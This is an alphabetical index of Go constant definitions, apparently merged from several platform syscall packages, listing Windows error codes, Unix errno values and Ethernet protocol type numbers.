ERROR_VHD_METADATA_WRITE_FAILURE                                          syscall.Errno = 0xC03A0011
ERROR_VHD_MISSING_CHANGE_TRACKING_INFORMATION                             syscall.Errno = 0xC03A0030
ERROR_VHD_PARENT_VHD_ACCESS_DENIED                                        syscall.Errno = 0xC03A0016
ERROR_VHD_PARENT_VHD_NOT_FOUND                                            syscall.Errno = 0xC03A000D
ERROR_VHD_RESIZE_WOULD_TRUNCATE_DATA                                      syscall.Errno = 0xC03A0025
ERROR_VHD_SHARED                                                          Handle        = 0xC05CFF0A
ERROR_VHD_SPARSE_HEADER_CHECKSUM_MISMATCH                                 syscall.Errno = 0xC03A0006
ERROR_VHD_SPARSE_HEADER_CORRUPT                                           syscall.Errno = 0xC03A0008
ERROR_VHD_SPARSE_HEADER_UNSUPPORTED_VERSION                               syscall.Errno = 0xC03A0007
ERROR_VID_CHILD_GPA_PAGE_SET_CORRUPTED                                    syscall.Errno = 0xC037000E
ERROR_VID_DUPLICATE_HANDLER                                               syscall.Errno = 0xC0370001
ERROR_VID_EXCEEDED_KM_CONTEXT_COUNT_LIMIT                                 syscall.Errno = 0xC037001E
ERROR_VID_EXCEEDED_MBP_ENTRY_MAP_LIMIT                                    syscall.Errno = 0xC037000C
ERROR_VID_HANDLER_NOT_PRESENT                                             syscall.Errno = 0xC0370004
ERROR_VID_INVALID_CHILD_GPA_PAGE_SET                                      syscall.Errno = 0xC0370022
ERROR_VID_INVALID_GPA_RANGE_HANDLE                                        syscall.Errno = 0xC0370015
ERROR_VID_INVALID_MEMORY_BLOCK_HANDLE                                     syscall.Errno = 0xC0370012
ERROR_VID_INVALID_MESSAGE_QUEUE_HANDLE                                    syscall.Errno = 0xC0370014
ERROR_VID_INVALID_NUMA_NODE_INDEX                                         syscall.Errno = 0xC0370010
ERROR_VID_INVALID_NUMA_SETTINGS                                           syscall.Errno = 0xC037000F
ERROR_VID_INVALID_OBJECT_NAME                                             syscall.Errno = 0xC0370005
ERROR_VID_INVALID_PPM_HANDLE                                              syscall.Errno = 0xC0370018
ERROR_VID_INVALID_PROCESSOR_STATE                                         syscall.Errno = 0xC037001D
ERROR_VID_KM_INTERFACE_ALREADY_INITIALIZED                                syscall.Errno = 0xC037001F
ERROR_VID_MBPS_ARE_LOCKED                                                 syscall.Errno = 0xC0370019
ERROR_VID_MBP_ALREADY_LOCKED_USING_RESERVED_PAGE                          syscall.Errno = 0xC0370025
ERROR_VID_MBP_COUNT_EXCEEDED_LIMIT                                        syscall.Errno = 0xC0370026
ERROR_VID_MB_PROPERTY_ALREADY_SET_RESET                                   syscall.Errno = 0xC0370020
ERROR_VID_MB_STILL_REFERENCED                                             syscall.Errno = 0xC037000D
ERROR_VID_MEMORY_BLOCK_LOCK_COUNT_EXCEEDED                                syscall.Errno = 0xC0370017
ERROR_VID_MESSAGE_QUEUE_ALREADY_EXISTS                                    syscall.Errno = 0xC037000B
ERROR_VID_MESSAGE_QUEUE_CLOSED                                            syscall.Errno = 0xC037001A
ERROR_VID_MESSAGE_QUEUE_NAME_TOO_LONG                                     syscall.Errno = 0xC0370007
ERROR_VID_MMIO_RANGE_DESTROYED                                            syscall.Errno = 0xC0370021
ERROR_VID_NOTIFICATION_QUEUE_ALREADY_ASSOCIATED                           syscall.Errno = 0xC0370011
ERROR_VID_NO_MEMORY_BLOCK_NOTIFICATION_QUEUE                              syscall.Errno = 0xC0370016
ERROR_VID_PAGE_RANGE_OVERFLOW                                             syscall.Errno = 0xC0370013
ERROR_VID_PARTITION_ALREADY_EXISTS                                        syscall.Errno = 0xC0370008
ERROR_VID_PARTITION_DOES_NOT_EXIST                                        syscall.Errno = 0xC0370009
ERROR_VID_PARTITION_NAME_NOT_FOUND                                        syscall.Errno = 0xC037000A
ERROR_VID_PARTITION_NAME_TOO_LONG                                         syscall.Errno = 0xC0370006
ERROR_VID_QUEUE_FULL                                                      syscall.Errno = 0xC0370003
ERROR_VID_REMOTE_NODE_PARENT_GPA_PAGES_USED                               syscall.Errno = 0x80370001
ERROR_VID_RESERVE_PAGE_SET_IS_BEING_USED                                  syscall.Errno = 0xC0370023
ERROR_VID_RESERVE_PAGE_SET_TOO_SMALL                                      syscall.Errno = 0xC0370024
ERROR_VID_SAVED_STATE_CORRUPT                                             syscall.Errno = 0xC0370027
ERROR_VID_SAVED_STATE_INCOMPATIBLE                                        syscall.Errno = 0xC0370029
ERROR_VID_SAVED_STATE_UNRECOGNIZED_ITEM                                   syscall.Errno = 0xC0370028
ERROR_VID_STOP_PENDING                                                    syscall.Errno = 0xC037001C
ERROR_VID_TOO_MANY_HANDLERS                                               syscall.Errno = 0xC0370002
ERROR_VID_VIRTUAL_PROCESSOR_LIMIT_EXCEEDED                                syscall.Errno = 0xC037001B
ERROR_VID_VTL_ACCESS_DENIED                                               syscall.Errno = 0xC037002A
ERROR_VIRTDISK_DISK_ALREADY_OWNED                                         syscall.Errno = 0xC03A001E
ERROR_VIRTDISK_DISK_ONLINE_AND_WRITABLE                                   syscall.Errno = 0xC03A001F
ERROR_VIRTDISK_NOT_VIRTUAL_DISK                                           syscall.Errno = 0xC03A0015
ERROR_VIRTDISK_PROVIDER_NOT_FOUND                                         syscall.Errno = 0xC03A0014
ERROR_VIRTDISK_UNSUPPORTED_DISK_SECTOR_SIZE                               syscall.Errno = 0xC03A001D
ERROR_VIRTUAL_DISK_LIMITATION                                             syscall.Errno = 0xC03A001A
ERROR_VIRUS_DELETED                                                       syscall.Errno = 226
ERROR_VIRUS_INFECTED                                                      syscall.Errno = 225
ERROR_VMCOMPUTE_CONNECTION_CLOSED                                         syscall.Errno = 0xC037010A
ERROR_VMCOMPUTE_CONNECT_FAILED                                            syscall.Errno = 0xC0370108
ERROR_VMCOMPUTE_HYPERV_NOT_INSTALLED                                      syscall.Errno = 0xC0370102
ERROR_VMCOMPUTE_IMAGE_MISMATCH                                            syscall.Errno = 0xC0370101
ERROR_VMCOMPUTE_INVALID_JSON                                              syscall.Errno = 0xC037010D
ERROR_VMCOMPUTE_INVALID_LAYER                                             syscall.Errno = 0xC0370112
ERROR_VMCOMPUTE_INVALID_STATE                                             syscall.Errno = 0xC0370105
ERROR_VMCOMPUTE_OPERATION_PENDING                                         syscall.Errno = 0xC0370103
ERROR_VMCOMPUTE_PROTOCOL_ERROR                                            syscall.Errno = 0xC0370111
ERROR_VMCOMPUTE_SYSTEM_ALREADY_EXISTS                                     syscall.Errno = 0xC037010F
ERROR_VMCOMPUTE_SYSTEM_ALREADY_STOPPED                                    syscall.Errno = 0xC0370110
ERROR_VMCOMPUTE_SYSTEM_NOT_FOUND                                          syscall.Errno = 0xC037010E
ERROR_VMCOMPUTE_TERMINATED                                                syscall.Errno = 0xC0370107
ERROR_VMCOMPUTE_TERMINATED_DURING_START                                   syscall.Errno = 0xC0370100
ERROR_VMCOMPUTE_TIMEOUT                                                   syscall.Errno = 0xC0370109
ERROR_VMCOMPUTE_TOO_MANY_NOTIFICATIONS                                    syscall.Errno = 0xC0370104
ERROR_VMCOMPUTE_UNEXPECTED_EXIT                                           syscall.Errno = 0xC0370106
ERROR_VMCOMPUTE_UNKNOWN_MESSAGE                                           syscall.Errno = 0xC037010B
ERROR_VMCOMPUTE_UNSUPPORTED_PROTOCOL_VERSION                              syscall.Errno = 0xC037010C
ERROR_VMCOMPUTE_WINDOWS_INSIDER_REQUIRED                                  syscall.Errno = 0xC0370113
ERROR_VNET_VIRTUAL_SWITCH_NAME_NOT_FOUND                                  syscall.Errno = 0xC0370200
ERROR_VOLMGR_ALL_DISKS_FAILED                                             syscall.Errno = 0xC0380029
ERROR_VOLMGR_BAD_BOOT_DISK                                                syscall.Errno = 0xC038004F
ERROR_VOLMGR_DATABASE_FULL                                                syscall.Errno = 0xC0380001
ERROR_VOLMGR_DIFFERENT_SECTOR_SIZE                                        syscall.Errno = 0xC038004E
ERROR_VOLMGR_DISK_CONFIGURATION_CORRUPTED                                 syscall.Errno = 0xC0380002
ERROR_VOLMGR_DISK_CONFIGURATION_NOT_IN_SYNC                               syscall.Errno = 0xC0380003
ERROR_VOLMGR_DISK_CONTAINS_NON_SIMPLE_VOLUME                              syscall.Errno = 0xC0380005
ERROR_VOLMGR_DISK_DUPLICATE                                               syscall.Errno = 0xC0380006
ERROR_VOLMGR_DISK_DYNAMIC                                                 syscall.Errno = 0xC0380007
ERROR_VOLMGR_DISK_ID_INVALID                                              syscall.Errno = 0xC0380008
ERROR_VOLMGR_DISK_INVALID                                                 syscall.Errno = 0xC0380009
ERROR_VOLMGR_DISK_LAST_VOTER                                              syscall.Errno = 0xC038000A
ERROR_VOLMGR_DISK_LAYOUT_INVALID                                          syscall.Errno = 0xC038000B
ERROR_VOLMGR_DISK_LAYOUT_NON_BASIC_BETWEEN_BASIC_PARTITIONS               syscall.Errno = 0xC038000C
ERROR_VOLMGR_DISK_LAYOUT_NOT_CYLINDER_ALIGNED                             syscall.Errno = 0xC038000D
ERROR_VOLMGR_DISK_LAYOUT_PARTITIONS_TOO_SMALL                             syscall.Errno = 0xC038000E
ERROR_VOLMGR_DISK_LAYOUT_PRIMARY_BETWEEN_LOGICAL_PARTITIONS               syscall.Errno = 0xC038000F
ERROR_VOLMGR_DISK_LAYOUT_TOO_MANY_PARTITIONS                              syscall.Errno = 0xC0380010
ERROR_VOLMGR_DISK_MISSING                                                 syscall.Errno = 0xC0380011
ERROR_VOLMGR_DISK_NOT_EMPTY                                               syscall.Errno = 0xC0380012
ERROR_VOLMGR_DISK_NOT_ENOUGH_SPACE                                        syscall.Errno = 0xC0380013
ERROR_VOLMGR_DISK_REVECTORING_FAILED                                      syscall.Errno = 0xC0380014
ERROR_VOLMGR_DISK_SECTOR_SIZE_INVALID                                     syscall.Errno = 0xC0380015
ERROR_VOLMGR_DISK_SET_NOT_CONTAINED                                       syscall.Errno = 0xC0380016
ERROR_VOLMGR_DISK_USED_BY_MULTIPLE_MEMBERS                                syscall.Errno = 0xC0380017
ERROR_VOLMGR_DISK_USED_BY_MULTIPLE_PLEXES                                 syscall.Errno = 0xC0380018
ERROR_VOLMGR_DYNAMIC_DISK_NOT_SUPPORTED                                   syscall.Errno = 0xC0380019
ERROR_VOLMGR_EXTENT_ALREADY_USED                                          syscall.Errno = 0xC038001A
ERROR_VOLMGR_EXTENT_NOT_CONTIGUOUS                                        syscall.Errno = 0xC038001B
ERROR_VOLMGR_EXTENT_NOT_IN_PUBLIC_REGION                                  syscall.Errno = 0xC038001C
ERROR_VOLMGR_EXTENT_NOT_SECTOR_ALIGNED                                    syscall.Errno = 0xC038001D
ERROR_VOLMGR_EXTENT_OVERLAPS_EBR_PARTITION                                syscall.Errno = 0xC038001E
ERROR_VOLMGR_EXTENT_VOLUME_LENGTHS_DO_NOT_MATCH                           syscall.Errno = 0xC038001F
ERROR_VOLMGR_FAULT_TOLERANT_NOT_SUPPORTED                                 syscall.Errno = 0xC0380020
ERROR_VOLMGR_INCOMPLETE_DISK_MIGRATION                                    syscall.Errno = 0x80380002
ERROR_VOLMGR_INCOMPLETE_REGENERATION                                      syscall.Errno = 0x80380001
ERROR_VOLMGR_INTERLEAVE_LENGTH_INVALID                                    syscall.Errno = 0xC0380021
ERROR_VOLMGR_MAXIMUM_REGISTERED_USERS                                     syscall.Errno = 0xC0380022
ERROR_VOLMGR_MEMBER_INDEX_DUPLICATE                                       syscall.Errno = 0xC0380024
ERROR_VOLMGR_MEMBER_INDEX_INVALID                                         syscall.Errno = 0xC0380025
ERROR_VOLMGR_MEMBER_IN_SYNC                                               syscall.Errno = 0xC0380023
ERROR_VOLMGR_MEMBER_MISSING                                               syscall.Errno = 0xC0380026
ERROR_VOLMGR_MEMBER_NOT_DETACHED                                          syscall.Errno = 0xC0380027
ERROR_VOLMGR_MEMBER_REGENERATING                                          syscall.Errno = 0xC0380028
ERROR_VOLMGR_MIRROR_NOT_SUPPORTED                                         syscall.Errno = 0xC038005B
ERROR_VOLMGR_NOTIFICATION_RESET                                           syscall.Errno = 0xC038002C
ERROR_VOLMGR_NOT_PRIMARY_PACK                                             syscall.Errno = 0xC0380052
ERROR_VOLMGR_NO_REGISTERED_USERS                                          syscall.Errno = 0xC038002A
ERROR_VOLMGR_NO_SUCH_USER                                                 syscall.Errno = 0xC038002B
ERROR_VOLMGR_NO_VALID_LOG_COPIES                                          syscall.Errno = 0xC0380058
ERROR_VOLMGR_NUMBER_OF_DISKS_INVALID                                      syscall.Errno = 0xC038005A
ERROR_VOLMGR_NUMBER_OF_DISKS_IN_MEMBER_INVALID                            syscall.Errno = 0xC0380055
ERROR_VOLMGR_NUMBER_OF_DISKS_IN_PLEX_INVALID                              syscall.Errno = 0xC0380054
ERROR_VOLMGR_NUMBER_OF_EXTENTS_INVALID                                    syscall.Errno = 0xC038004D
ERROR_VOLMGR_NUMBER_OF_MEMBERS_INVALID                                    syscall.Errno = 0xC038002D
ERROR_VOLMGR_NUMBER_OF_PLEXES_INVALID                                     syscall.Errno = 0xC038002E
ERROR_VOLMGR_PACK_CONFIG_OFFLINE                                          syscall.Errno = 0xC0380050
ERROR_VOLMGR_PACK_CONFIG_ONLINE                                           syscall.Errno = 0xC0380051
ERROR_VOLMGR_PACK_CONFIG_UPDATE_FAILED                                    syscall.Errno = 0xC0380004
ERROR_VOLMGR_PACK_DUPLICATE                                               syscall.Errno = 0xC038002F
ERROR_VOLMGR_PACK_HAS_QUORUM                                              syscall.Errno = 0xC0380034
ERROR_VOLMGR_PACK_ID_INVALID                                              syscall.Errno = 0xC0380030
ERROR_VOLMGR_PACK_INVALID                                                 syscall.Errno = 0xC0380031
ERROR_VOLMGR_PACK_LOG_UPDATE_FAILED                                       syscall.Errno = 0xC0380053
ERROR_VOLMGR_PACK_NAME_INVALID                                            syscall.Errno = 0xC0380032
ERROR_VOLMGR_PACK_OFFLINE                                                 syscall.Errno = 0xC0380033
ERROR_VOLMGR_PACK_WITHOUT_QUORUM                                          syscall.Errno = 0xC0380035
ERROR_VOLMGR_PARTITION_STYLE_INVALID                                      syscall.Errno = 0xC0380036
ERROR_VOLMGR_PARTITION_UPDATE_FAILED                                      syscall.Errno = 0xC0380037
ERROR_VOLMGR_PLEX_INDEX_DUPLICATE                                         syscall.Errno = 0xC0380039
ERROR_VOLMGR_PLEX_INDEX_INVALID                                           syscall.Errno = 0xC038003A
ERROR_VOLMGR_PLEX_IN_SYNC                                                 syscall.Errno = 0xC0380038
ERROR_VOLMGR_PLEX_LAST_ACTIVE                                             syscall.Errno = 0xC038003B
ERROR_VOLMGR_PLEX_MISSING                                                 syscall.Errno = 0xC038003C
ERROR_VOLMGR_PLEX_NOT_RAID5                                               syscall.Errno = 0xC038003F
ERROR_VOLMGR_PLEX_NOT_SIMPLE                                              syscall.Errno = 0xC0380040
ERROR_VOLMGR_PLEX_NOT_SIMPLE_SPANNED                                      syscall.Errno = 0xC0380057
ERROR_VOLMGR_PLEX_REGENERATING                                            syscall.Errno = 0xC038003D
ERROR_VOLMGR_PLEX_TYPE_INVALID                                            syscall.Errno = 0xC038003E
ERROR_VOLMGR_PRIMARY_PACK_PRESENT                                         syscall.Errno = 0xC0380059
ERROR_VOLMGR_RAID5_NOT_SUPPORTED                                          syscall.Errno = 0xC038005C
ERROR_VOLMGR_STRUCTURE_SIZE_INVALID                                       syscall.Errno = 0xC0380041
ERROR_VOLMGR_TOO_MANY_NOTIFICATION_REQUESTS                               syscall.Errno = 0xC0380042
ERROR_VOLMGR_TRANSACTION_IN_PROGRESS                                      syscall.Errno = 0xC0380043
ERROR_VOLMGR_UNEXPECTED_DISK_LAYOUT_CHANGE                                syscall.Errno = 0xC0380044
ERROR_VOLMGR_VOLUME_CONTAINS_MISSING_DISK                                 syscall.Errno = 0xC0380045
ERROR_VOLMGR_VOLUME_ID_INVALID                                            syscall.Errno = 0xC0380046
ERROR_VOLMGR_VOLUME_LENGTH_INVALID                                        syscall.Errno = 0xC0380047
ERROR_VOLMGR_VOLUME_LENGTH_NOT_SECTOR_SIZE_MULTIPLE                       syscall.Errno = 0xC0380048
ERROR_VOLMGR_VOLUME_MIRRORED                                              syscall.Errno = 0xC0380056
ERROR_VOLMGR_VOLUME_NOT_MIRRORED                                          syscall.Errno = 0xC0380049
ERROR_VOLMGR_VOLUME_NOT_RETAINED                                          syscall.Errno = 0xC038004A
ERROR_VOLMGR_VOLUME_OFFLINE                                               syscall.Errno = 0xC038004B
ERROR_VOLMGR_VOLUME_RETAINED                                              syscall.Errno = 0xC038004C
ERROR_VOLSNAP_ACTIVATION_TIMEOUT                                          Handle        = 0x80820002
ERROR_VOLSNAP_BOOTFILE_NOT_VALID                                          Handle        = 0x80820001
ERROR_VOLSNAP_HIBERNATE_READY                                             syscall.Errno = 761
ERROR_VOLSNAP_PREPARE_HIBERNATE                                           syscall.Errno = 655
ERROR_VOLUME_CONTAINS_SYS_FILES                                           syscall.Errno = 4337
ERROR_VOLUME_DIRTY                                                        syscall.Errno = 6851
ERROR_VOLUME_MOUNTED                                                      syscall.Errno = 743
ERROR_VOLUME_NOT_CLUSTER_ALIGNED                                          syscall.Errno = 407
ERROR_VOLUME_NOT_SIS_ENABLED                                              syscall.Errno = 4500
ERROR_VOLUME_NOT_SUPPORT_EFS                                              syscall.Errno = 6014
ERROR_VRF_CFG_ENABLED                                                     syscall.Errno = 1183
ERROR_VSMB_SAVED_STATE_CORRUPT                                            syscall.Errno = 0xC0370401
ERROR_VSMB_SAVED_STATE_FILE_NOT_FOUND                                     syscall.Errno = 0xC0370400
ERROR_VSM_DMA_PROTECTION_NOT_IN_USE                                       syscall.Errno = 4561
ERROR_VSM_NOT_INITIALIZED                                                 syscall.Errno = 4560
ERROR_WAIT_1                                                              syscall.Errno = 731
ERROR_WAIT_2                                                              syscall.Errno = 732
ERROR_WAIT_3                                                              syscall.Errno = 733
ERROR_WAIT_63                                                             syscall.Errno = 734
ERROR_WAIT_FOR_OPLOCK                                                     syscall.Errno = 765
ERROR_WAIT_NO_CHILDREN                                                    syscall.Errno = 128
ERROR_WAKE_SYSTEM                                                         syscall.Errno = 730
ERROR_WAKE_SYSTEM_DEBUGGER                                                syscall.Errno = 675
ERROR_WAS_LOCKED                                                          syscall.Errno = 717
ERROR_WAS_UNLOCKED                                                        syscall.Errno = 715
ERROR_WINDOW_NOT_COMBOBOX                                                 syscall.Errno = 1423
ERROR_WINDOW_NOT_DIALOG                                                   syscall.Errno = 1420
ERROR_WINDOW_OF_OTHER_THREAD                                              syscall.Errno = 1408
ERROR_WINS_INTERNAL                                                       syscall.Errno = 4000
ERROR_WIP_ENCRYPTION_FAILED                                               syscall.Errno = 6023
ERROR_WMI_ALREADY_DISABLED                                                syscall.Errno = 4212
ERROR_WMI_ALREADY_ENABLED                                                 syscall.Errno = 4206
ERROR_WMI_DP_FAILED                                                       syscall.Errno = 4209
ERROR_WMI_DP_NOT_FOUND                                                    syscall.Errno = 4204
ERROR_WMI_GUID_DISCONNECTED                                               syscall.Errno = 4207
ERROR_WMI_GUID_NOT_FOUND                                                  syscall.Errno = 4200
ERROR_WMI_INSTANCE_NOT_FOUND                                              syscall.Errno = 4201
ERROR_WMI_INVALID_MOF                                                     syscall.Errno = 4210
ERROR_WMI_INVALID_REGINFO                                                 syscall.Errno = 4211
ERROR_WMI_ITEMID_NOT_FOUND                                                syscall.Errno = 4202
ERROR_WMI_READ_ONLY                                                       syscall.Errno = 4213
ERROR_WMI_SERVER_UNAVAILABLE                                              syscall.Errno = 4208
ERROR_WMI_SET_FAILURE                                                     syscall.Errno = 4214
ERROR_WMI_TRY_AGAIN                                                       syscall.Errno = 4203
ERROR_WMI_UNRESOLVED_INSTANCE_REF                                         syscall.Errno = 4205
ERROR_WOF_FILE_RESOURCE_TABLE_CORRUPT                                     syscall.Errno = 4448
ERROR_WOF_WIM_HEADER_CORRUPT                                              syscall.Errno = 4446
ERROR_WOF_WIM_RESOURCE_TABLE_CORRUPT                                      syscall.Errno = 4447
ERROR_WORKING_SET_QUOTA                                                   syscall.Errno = 1453
ERROR_WOW_ASSERTION                                                       syscall.Errno = 670
ERROR_WRITE_FAULT                                                         syscall.Errno = 29
ERROR_WRITE_PROTECT                                                       syscall.Errno = 19
ERROR_WRONG_COMPARTMENT                                                   syscall.Errno = 1468
ERROR_WRONG_DISK                                                          syscall.Errno = 34
ERROR_WRONG_EFS                                                           syscall.Errno = 6005
ERROR_WRONG_INF_STYLE                        Errno = 0x20000000 
ERROR_WRONG_INF_TYPE                         Errno = 0x20000000 
ERROR_WRONG_PASSWORD                                                      syscall.Errno = 1323
ERROR_WRONG_TARGET_NAME                                                   syscall.Errno = 1396
ERROR_WX86_ERROR                                                          syscall.Errno = 540
ERROR_WX86_WARNING                                                        syscall.Errno = 539
ERROR_XMLDSIG_ERROR                                                       syscall.Errno = 1466
ERROR_XML_ENCODING_MISMATCH                                               syscall.Errno = 14100
ERROR_XML_PARSE_ERROR                                                     syscall.Errno = 1465
ESAD            = syscall.Errno(0x71)
ESHLIBVERS      = syscall.Errno(0x57)
ESHUTDOWN          = Errno(1125)
ESHUTDOWN       = syscall.Errno(0x3a)
ESHUTDOWN       = syscall.Errno(0x4d)
ESHUTDOWN       = syscall.Errno(0x6c)
ESHUTDOWN       = syscall.Errno(0x8f)
ESOCKTNOSUPPORT    = Errno(1111)
ESOCKTNOSUPPORT = syscall.Errno(0x2c)
ESOCKTNOSUPPORT = syscall.Errno(0x3f)
ESOCKTNOSUPPORT = syscall.Errno(0x5e)
ESOCKTNOSUPPORT = syscall.Errno(0x79)
ESOFT           = syscall.Errno(0x6f)
ESPIPE             = Errno(142)
ESPIPE          = syscall.Errno(0x1d)
ESPIPE      = syscall.Errno(0x1d)
ESP_V4_FLOW                                 = 0xa
ESP_V6_FLOW                                 = 0xc
ESRCH              = Errno(143)
ESRCH           = syscall.Errno(0x3)
ESRCH       = syscall.Errno(0x3)
ESRMNT             = Errno(1146)
ESRMNT          = syscall.Errno(0x45)
ESRMNT          = syscall.Errno(0x54)
ESR_MAGIC                        = 0x45535201
ESTALE             = Errno(1134)
ESTALE          = syscall.Errno(0x34)
ESTALE          = syscall.Errno(0x46)
ESTALE          = syscall.Errno(0x74)
ESTALE          = syscall.Errno(0x97)
ESTRPIPE        = syscall.Errno(0x56)
ESTRPIPE        = syscall.Errno(0x5b)
ESTRPIPE        = syscall.Errno(0x5c)
ESYSERROR       = syscall.Errno(0x5a)
ETHERCAP_JUMBO_MTU                = 0x4
ETHERCAP_VLAN_HWTAGGING           = 0x2
ETHERCAP_VLAN_MTU                 = 0x1
ETHERMIN                          = 0x2e
ETHERMTU                          = 0x5dc
ETHERMTU_JUMBO                    = 0x2328
ETHERNET_CSMACD               = 0x6
ETHERTYPE_8023                    = 0x4
ETHERTYPE_AARP                    = 0x80f3
ETHERTYPE_ACCTON                  = 0x8390
ETHERTYPE_AEONIC                  = 0x8036
ETHERTYPE_ALPHA                   = 0x814a
ETHERTYPE_AMBER                   = 0x6008
ETHERTYPE_AMOEBA                  = 0x8145
ETHERTYPE_AOE                     = 0x88a2
ETHERTYPE_APOLLO                  = 0x80f7
ETHERTYPE_APOLLODOMAIN            = 0x8019
ETHERTYPE_APPLETALK               = 0x809b
ETHERTYPE_APPLITEK                = 0x80c7
ETHERTYPE_ARGONAUT                = 0x803a
ETHERTYPE_ARP                     = 0x806
ETHERTYPE_AT                      = 0x809b
ETHERTYPE_ATALK                   = 0x809b
ETHERTYPE_ATOMIC                  = 0x86df
ETHERTYPE_ATT                     = 0x8069
ETHERTYPE_ATTSTANFORD             = 0x8008
ETHERTYPE_AUTOPHON                = 0x806a
ETHERTYPE_AXIS                    = 0x8856
ETHERTYPE_BCLOOP                  = 0x9003
ETHERTYPE_BOFL                    = 0x8102
ETHERTYPE_CABLETRON               = 0x7034
ETHERTYPE_CHAOS                   = 0x804
ETHERTYPE_COMDESIGN               = 0x806c
ETHERTYPE_COMPUGRAPHIC            = 0x806d
ETHERTYPE_COUNTERPOINT            = 0x8062
ETHERTYPE_CRONUS                  = 0x8004
ETHERTYPE_CRONUSVLN               = 0x8003
ETHERTYPE_DCA                     = 0x1234
ETHERTYPE_DDE                     = 0x807b
ETHERTYPE_DEBNI                   = 0xaaaa
ETHERTYPE_DECAM                   = 0x8048
ETHERTYPE_DECCUST                 = 0x6006
ETHERTYPE_DECDIAG                 = 0x6005
ETHERTYPE_DECDNS                  = 0x803c
ETHERTYPE_DECDTS                  = 0x803e
ETHERTYPE_DECEXPER                = 0x6000
ETHERTYPE_DECLAST                 = 0x8041
ETHERTYPE_DECLTM                  = 0x803f
ETHERTYPE_DECMUMPS                = 0x6009
ETHERTYPE_DECNETBIOS              = 0x8040
ETHERTYPE_DELTACON                = 0x86de
ETHERTYPE_DIDDLE                  = 0x4321
ETHERTYPE_DLOG1                   = 0x660
ETHERTYPE_DLOG2                   = 0x661
ETHERTYPE_DN                      = 0x6003
ETHERTYPE_DOGFIGHT                = 0x1989
ETHERTYPE_DSMD                    = 0x8039
ETHERTYPE_ECMA                    = 0x803
ETHERTYPE_ENCRYPT                 = 0x803d
ETHERTYPE_ES                      = 0x805d
ETHERTYPE_EXCELAN                 = 0x8010
ETHERTYPE_EXPERDATA               = 0x8049
ETHERTYPE_FLIP                    = 0x8146
ETHERTYPE_FLOWCONTROL             = 0x8808
ETHERTYPE_FRARP                   = 0x808
ETHERTYPE_GENDYN                  = 0x8068
ETHERTYPE_HAYES                   = 0x8130
ETHERTYPE_HIPPI_FP                = 0x8180
ETHERTYPE_HITACHI                 = 0x8820
ETHERTYPE_HP                      = 0x8005
ETHERTYPE_IEEEPUP                 = 0xa00
ETHERTYPE_IEEEPUPAT               = 0xa01
ETHERTYPE_IMLBL                   = 0x4c42
ETHERTYPE_IMLBLDIAG               = 0x424c
ETHERTYPE_IP                      = 0x800
ETHERTYPE_IPAS                    = 0x876c
ETHERTYPE_IPV6                    = 0x86dd
ETHERTYPE_IPX                     = 0x8137
ETHERTYPE_IPXNEW                  = 0x8037
ETHERTYPE_KALPANA                 = 0x8582
ETHERTYPE_LANBRIDGE               = 0x8038
ETHERTYPE_LANPROBE                = 0x8888
ETHERTYPE_LAT                     = 0x6004
ETHERTYPE_LBACK                   = 0x9000
ETHERTYPE_LITTLE                  = 0x8060
ETHERTYPE_LLDP                    = 0x88cc
ETHERTYPE_LOGICRAFT               = 0x8148
ETHERTYPE_LOOPBACK                = 0x9000
ETHERTYPE_MACSEC                  = 0x88e5
ETHERTYPE_MATRA                   = 0x807a
ETHERTYPE_MAX                     = 0xffff
ETHERTYPE_MERIT                   = 0x807c
ETHERTYPE_MICP                    = 0x873a
ETHERTYPE_MOPDL                   = 0x6001
ETHERTYPE_MOPRC                   = 0x6002
ETHERTYPE_MOTOROLA                = 0x818d
ETHERTYPE_MPLS                    = 0x8847
ETHERTYPE_MPLS_MCAST              = 0x8848
ETHERTYPE_MUMPS                   = 0x813f
ETHERTYPE_NBPCC                   = 0x3c04
ETHERTYPE_NBPCLAIM                = 0x3c09
ETHERTYPE_NBPCLREQ                = 0x3c05
ETHERTYPE_NBPCLRSP                = 0x3c06
ETHERTYPE_NBPCREQ                 = 0x3c02
ETHERTYPE_NBPCRSP                 = 0x3c03
ETHERTYPE_NBPDG                   = 0x3c07
ETHERTYPE_NBPDGB                  = 0x3c08
ETHERTYPE_NBPDLTE                 = 0x3c0a
ETHERTYPE_NBPRAR                  = 0x3c0c
ETHERTYPE_NBPRAS                  = 0x3c0b
ETHERTYPE_NBPRST                  = 0x3c0d
ETHERTYPE_NBPSCD                  = 0x3c01
ETHERTYPE_NBPVCD                  = 0x3c00
ETHERTYPE_NBS                     = 0x802
ETHERTYPE_NCD                     = 0x8149
ETHERTYPE_NESTAR                  = 0x8006
ETHERTYPE_NETBEUI                 = 0x8191
ETHERTYPE_NOVELL                  = 0x8138
ETHERTYPE_NS                      = 0x600
ETHERTYPE_NSAT                    = 0x601
ETHERTYPE_NSCOMPAT                = 0x807
ETHERTYPE_NTRAILER                = 0x10
ETHERTYPE_OS9                     = 0x7007
ETHERTYPE_OS9NET                  = 0x7009
ETHERTYPE_PACER                   = 0x80c6
ETHERTYPE_PAE                     = 0x888e
ETHERTYPE_PBB                     = 0x88e7
ETHERTYPE_PCS                     = 0x4242
ETHERTYPE_PLANNING                = 0x8044
ETHERTYPE_PPP                     = 0x880b
ETHERTYPE_PPPOE                   = 0x8864
ETHERTYPE_PPPOEDISC               = 0x8863
ETHERTYPE_PRIMENTS                = 0x7031
ETHERTYPE_PUP                     = 0x200
ETHERTYPE_PUPAT                   = 0x200
ETHERTYPE_QINQ                    = 0x88a8
ETHERTYPE_RACAL                   = 0x7030
ETHERTYPE_RATIONAL                = 0x8150
ETHERTYPE_RAWFR                   = 0x6559
ETHERTYPE_RCL                     = 0x1995
ETHERTYPE_RDP                     = 0x8739
ETHERTYPE_RETIX                   = 0x80f2
ETHERTYPE_REVARP                  = 0x8035
ETHERTYPE_SCA                     = 0x6007
ETHERTYPE_SECTRA                  = 0x86db
ETHERTYPE_SECUREDATA              = 0x876d
ETHERTYPE_SGITW                   = 0x817e
ETHERTYPE_SG_BOUNCE               = 0x8016
ETHERTYPE_SG_DIAG                 = 0x8013
ETHERTYPE_SG_NETGAMES             = 0x8014
ETHERTYPE_SG_RESV                 = 0x8015
ETHERTYPE_SIMNET                  = 0x5208
ETHERTYPE_SLOW                    = 0x8809
ETHERTYPE_SLOWPROTOCOLS           = 0x8809
ETHERTYPE_SNA                     = 0x80d5
ETHERTYPE_SNMP                    = 0x814c
ETHERTYPE_SONIX                   = 0xfaf5
ETHERTYPE_SPIDER                  = 0x809f
ETHERTYPE_SPRITE                  = 0x500
ETHERTYPE_STP                     = 0x8181
ETHERTYPE_TALARIS                 = 0x812b
